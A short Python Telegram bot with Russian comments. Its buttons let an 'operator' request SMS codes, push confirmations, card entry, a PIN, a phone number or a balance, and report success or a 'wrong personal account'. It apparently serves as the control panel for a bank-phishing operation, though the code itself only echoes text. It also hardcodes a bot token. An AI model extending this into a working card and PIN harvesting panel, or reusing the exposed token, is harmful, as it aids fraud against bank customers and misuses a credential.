from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes

# 🔹 Укажи свой Telegram Bot Token
BOT_TOKEN = "7368319072:AAGRGJU9NqchsjSMGHdVSrKGZEXYfyyRiUE"

# 📌 Обработчик команды /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Приветственное сообщение"""
    await update.message.reply_text("👋 Добро пожаловать! Ожидаем данные...")

# 📌 Обработчик нажатий кнопок
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обрабатывает выбор оператора"""
    query = update.callback_query
    await query.answer()

    responses = {
        "sms": "Вы выбрали SMS",
        "push": "Вы выбрали Пуш",
        "card": "Вы выбрали Ввод карты",
        "pin": "Вы выбрали PIN",
        "limits": "Вы выбрали Лимиты",
        "wrong_code": "Вы выбрали Неверный код",
        "phone": "Вы выбрали Номер телефона",
        "custom_text": "Вы выбрали Свой текст/фото",
        "topup": "Вы выбрали Пополнение",
        "balance": "Вы выбрали Баланс",
        "success": "✅ Успех",
        "wrong_lk": "❌ Неверный ЛК"
    }

    response_text = responses.get(query.data, "Неизвестная команда")
    await query.message.reply_text(response_text)

# 📌 Запуск бота
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # 🔹 Обработчик команды /start
    app.add_handler(CommandHandler("start", start))
    
    # 🔹 Обработчик нажатий кнопок
    app.add_handler(CallbackQueryHandler(button_handler))

    # Запуск бота
    print("✅ Бот запущен!")
    app.run_polling()

if __name__ == "__main__":
    main()